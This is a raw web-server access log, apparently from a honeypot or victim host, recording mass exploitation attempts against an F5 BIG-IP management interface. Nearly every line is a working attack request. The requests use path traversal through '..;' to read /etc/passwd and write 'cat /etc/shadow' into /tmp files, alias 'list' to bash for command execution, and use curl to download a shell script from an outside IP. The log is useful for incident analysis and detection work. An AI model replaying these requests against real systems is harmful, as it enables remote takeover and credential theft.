Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 6, 2020 @ 09:33:10.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:33:09.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:32:59.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:32:58.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:32:57.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:31:52.000",46.244.28.8,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list%20auth%20user,python-requests/2.23.0,200
"Jul 6, 2020 @ 09:30:26.000",71.6.142.85,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",200
"Jul 6, 2020 @ 09:30:07.000",71.6.142.85,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",200
"Jul 6, 2020 @ 09:30:02.000",46.244.28.8,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list%20auth%20user,python-requests/2.23.0,200
"Jul 6, 2020 @ 09:30:00.000",103.114.72.105,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:29:58.000",103.114.72.105,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:29:47.000",71.6.142.85,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",200
"Jul 6, 2020 @ 09:29:10.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:09.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:08.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=cat%20/etc/shadow,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:06.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=cat%20/etc/shadow,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:05.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:03.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:02.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:29:00.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:28:48.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:28:46.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=cat%20/etc/shadow,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:28:43.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:28:40.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:28:20.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:28:19.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:28:18.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:28:05.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:28:05.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:28:03.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:27:02.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:27:01.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:59.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:54.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&content=curl+http://45.77.28.70:80/inf5.sh+-o+/tmp/in.sh,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:53.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&content=curl+http://45.77.28.70:80/inf5.sh+-o+/tmp/in.sh,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:52.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:52.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:51.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:51.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:26:40.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:39.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:38.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:36.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:34.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:32.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:26:15.000",212.252.34.183,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 6, 2020 @ 09:25:40.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:25:38.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:25:36.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:25:27.000",212.252.34.183,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 6, 2020 @ 09:25:20.000",156.204.67.207,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:25:18.000",156.204.67.207,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:25:08.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:25:08.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:25:06.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:24:48.000",156.204.67.207,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:24:47.000",156.204.67.207,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:24:11.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:24:09.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
